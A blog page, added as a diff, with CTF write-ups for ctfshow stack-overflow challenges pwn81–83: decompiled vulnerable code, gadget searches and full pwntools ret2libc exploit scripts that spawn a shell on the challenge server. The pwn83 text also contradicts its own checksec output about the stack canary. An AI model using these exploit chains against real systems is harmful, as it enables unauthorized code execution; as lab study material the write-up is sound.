@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>栈溢出pwn81-90 | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出pwn81-90 | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/ctf/ctfshow_pwn/栈溢出pwn81-90/">
+  <link rel="canonical" href="https://jerryxie.top/notes/ctf/ctfshow_pwn/栈溢出pwn81-90/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/ctf/">ctf</a>
+          
+            <a class="category-chip" href="/categories/ctf/ctfshow-pwn/">ctfshow_pwn</a>
+          
+        
+      </div>
+      <h1>栈溢出pwn81-90</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>8 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>ctf/ctfshow_pwn/栈溢出pwn81-90.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <h2 id="pwn81"><a href="#pwn81" class="headerlink" title="pwn81"></a>pwn81</h2><figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/CTFSHOW/81/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=3d02ff0ab12b5833dd9785f1ff2eec91457b584d, not stripped</span><br></pre></td></tr></table></figure>
+
+<p><code>NX enabled</code>64位动态链接</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">void</span> *handle; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    logo();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s simple,O.o&quot;</span>);</span><br><span class="line">    handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, <span class="number">258</span>);</span><br><span class="line">    v3 = dlsym(handle, <span class="string">&quot;system&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, v3);</span><br><span class="line">    ctfshow();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xFu</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个函数从来没见过<code>dlsym(Dynamic Linking Symbol)</code>，函数原型：</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数原型</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">dlsym</span><span class="params">(<span class="type">void</span> *handle, <span class="type">const</span> <span class="type">char</span> *symbol)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// handle的选择</span></span><br><span class="line"><span class="comment">// RTLD_DEFAULT 默认从搜索共享库中符号symbol第一次出现的地址</span></span><br><span class="line"><span class="comment">// 这个参数一般是选择头文件里面定义的标准函数，因为头文件的最初展开，所以第一次搜索到的位置就是系统函数的地址</span></span><br><span class="line"><span class="comment">// RTLD_NEXT</span></span><br><span class="line"><span class="comment">// 表示在当前库以后按默认的顺序搜索symbol第一次出现的位置，一般是hook重写了系统函数，用于检索自定义的函数的地址</span></span><br></pre></td></tr></table></figure>
+
+<p>我们运行一下能看到打印了地址，这地址也就是<code>system()</code>函数的地址</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Maybe it&#x27;s simple,O.o</span><br><span class="line">0x711087050d70</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>栈溢出，offset &#x3D; <code>0x80+8</code></p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary pwn --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">0x0000000000000a93 : pop rdi ; ret</span><br><span class="line">...</span><br><span class="line">0x00000000000006f6 : ret</span><br></pre></td></tr></table></figure>
+
+<p>一开始想利用本身的gadget的，但是但由于开了PIE随机地址，不能直接用elf的<code>gadget</code>，所以说需要利用libc库中的gadget</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/54208227/1774488233640-52307ab1-9d80-4694-87b4-0d0c5fb5895a.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>找到这两个即可，注意加上<code>libcbase_addr</code>即可</p>
+<figure class="highlight plaintext" data-language="plaintext" data-language-label="Plain text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &#x27;pop|ret&#x27; | grep &#x27;ret&#x27; </span><br><span class="line">0x000000000002164f : pop rdi ; ret</span><br><span class="line">0x00000000000008aa : ret</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">r&#x27;/mnt/hgfs/E/CTF/pwn学习/CTFSHOW/81/pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">r&#x27;/mnt/hgfs/E/CTF/pwn学习/CTFSHOW/81/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># elf = ELF(r&quot;E:\CTF\pwn学习\CTFSHOW\81\pwn&quot;)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,  <span class="number">28309</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+ p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[:<span class="number">16</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span>+<span class="number">8</span></span><br><span class="line">rdi_ret = <span class="number">0x2164f</span>+libc_base</span><br><span class="line">ret_addr = <span class="number">0x8aa</span>+libc_base</span><br><span class="line"></span><br><span class="line">payload = offset = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(leak_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn82"><a href="#pwn82" class="headerlink" title="pwn82"></a>pwn82</h2><blockquote>
+<p>高级ROP 32 位 NO-RELRO</p>
+</blockquote>
+<figure class="highlight bash" data-language="bash" data-language-label="Shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/CTFSHOW/82/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=4246d04ac4602f2323d98c0288704a86d074947d, not stripped</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">112</span>]; <span class="comment">// [esp+0h] [ebp-7Ch] BYREF</span></span><br><span class="line">    <span class="type">int</span> *p_argc; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    p_argc = &amp;argc;</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to CTFshowPWN!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf[<span class="number">24</span>], <span class="number">0</span>, <span class="number">0x4Cu</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    n = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, n);</span><br><span class="line">    show();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>buf</code>栈溢出，这里使用了write函数，利用泄露地址ret2libc。</p>
+<p>write函数原型如下：</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span>*buf,<span class="type">size_t</span> count)</span>;</span><br><span class="line">参数说明：</span><br><span class="line">  fd:是文件描述符（write所对应的是写，即就是<span class="number">1</span>）</span><br><span class="line">  buf:通常是一个字符串，需要写入的字符串</span><br><span class="line">  count：是每次写入的字节数</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">r&quot;E:\CTF\pwn学习\CTFSHOW\82\pwn&quot;</span>)</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28137</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6c</span>+<span class="number">4</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">show_addr = elf.symbols[<span class="string">&#x27;show&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(show_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(write_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to CTFshowPWN!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload2 += p32(system)</span><br><span class="line">payload2 += p32(show_addr)</span><br><span class="line">payload2 += p32(bin_sh)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里不知道为啥他自己的libc用不了，用了libcsearcher做的。</p>
+<p>这里在网上看到了另外一个做的办法，这里记一下、后面来看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/maicaii/p/18710479#pwn82">https://www.cnblogs.com/maicaii/p/18710479#pwn82</a></p>
+<h2 id="pwn83"><a href="#pwn83" class="headerlink" title="pwn83"></a>pwn83</h2><figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/E/CTF/pwn学习/CTFSHOW/83/pwn&#x27;</span></span><br><span class="line">    Arch:       i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br><span class="line">    Stripped:   No</span><br><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="params">(SYSV)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=c25a83075ff0ef6806ffa376c456b6421658e472, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>32位，有canary，开启NX</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>出现栈溢出，还是用ret2libc</p>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn81"><span class="toc-list-text">pwn81</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn82"><span class="toc-list-text">pwn82</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#pwn83"><span class="toc-list-text">pwn83</span></a></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from ctf</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/ctf/_CTF/">
+              <strong>_CTF</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/_CTF/Week_1/">
+              <strong>Week_1</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/">
+              <strong>2025_SWPU-NSSCTF_秋季招新入门训练赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/ctf/2025_SWPU-NSSCTF_%E7%A7%8B%E5%AD%A3%E6%8B%9B%E6%96%B0%E5%85%A5%E9%97%A8%E8%AE%AD%E7%BB%83%E8%B5%9B/%E8%BF%98%E5%9C%A8%E5%86%99%E3%80%82CopperSmith%E7%AE%97%E6%B3%95/">
+              <strong>还在写。CopperSmith算法</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
